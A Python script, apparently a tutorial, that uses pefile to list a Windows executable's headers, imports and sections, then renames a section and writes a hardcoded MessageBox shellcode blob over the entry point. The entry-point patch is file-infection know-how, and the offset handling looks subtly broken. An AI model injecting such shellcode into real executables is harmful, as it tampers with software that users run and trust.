from pathlib import Path
import pefile
import argparse
import mmap
parser = argparse.ArgumentParser()
parser.add_argument("file_path", type=Path)

p = parser.parse_args()
# Parse the data contained in the buffer
pe = pefile.PE(p.file_path, fast_load=True)

# Map the executable in memory
fd = open(p.file_path, 'rb')
pe_data = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_READ)

# Then you can call the following method later in your code
pe.full_load()

# Reading DOS_HEADER filed
print("[*] Listing DOS_HEADER fields...")
for keys in pe.DOS_HEADER.__keys__:
    for field in keys:
        print('\t' + field)

# Display full content of structure
for field in pe.DOS_HEADER.dump():
    print(field)
# Display data directories
print("[*] Number of data directories = %d" %
      pe.OPTIONAL_HEADER.NumberOfRvaAndSizes)
for data_directory in pe.OPTIONAL_HEADER.DATA_DIRECTORY:
    print('\t' + data_directory.name)

# display the address/size pairs of each path
for data_dir in pe.OPTIONAL_HEADER.DATA_DIRECTORY:
    print(data_dir)

# Listing the Symbols
print("[*] Listing imported DLLs...")
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print('\t' + entry.dll.decode('utf-8'))

# list each imported function in a specific DLL
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    dll_name = entry.dll.decode('utf-8')
    if dll_name == "KERNEL32.dll":
        print("[*] Kernel32.dll imports:")
        for func in entry.imports:
            print("\t%s at 0x%08x" % (func.name.decode('utf-8'), func.address))

# Listing sections
for section in pe.sections:
    print(section.Name.decode('utf-8'))
    print("\tVirtual Address: " + hex(section.VirtualAddress))
    print("\tVirtual Size: " + hex(section.Misc_VirtualSize))
    print("\tRaw Size: " + hex(section.SizeOfRawData))

## dump the full content of a section ##
print(pe.sections[0])

# modifying the structures
print("[*] Original Section name = %s" % pe.sections[0].Name.decode('utf-8'))
print("[*] Editing values...\n")

# Edit values
pe.sections[0].Name = ".axc".encode()

## Code Injection ##
shellcode = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9")
shellcode += b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
shellcode += b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
shellcode += b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
shellcode += b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
shellcode += b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
shellcode += b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
shellcode += b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
shellcode += b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
shellcode += b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
shellcode += b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
shellcode += b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
shellcode += b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
shellcode += b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
shellcode += b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
shellcode += b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68"
shellcode += b"\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c"
shellcode += b"\x24\x0a\x89\xe3\x68\x58\x20\x20\x20\x68\x4d\x53\x46"
shellcode += b"\x21\x68\x72\x6f\x6d\x20\x68\x6f\x2c\x20\x66\x68\x48"
shellcode += b"\x65\x6c\x6c\x31\xc9\x88\x4c\x24\x10\x89\xe1\x31\xd2"
shellcode += b"\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08"

ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
print("[*] Writting %d bytes at offset %s" % (len(shellcode), hex(ep)))
pe.set_bytes_at_offset(ep, shellcode)
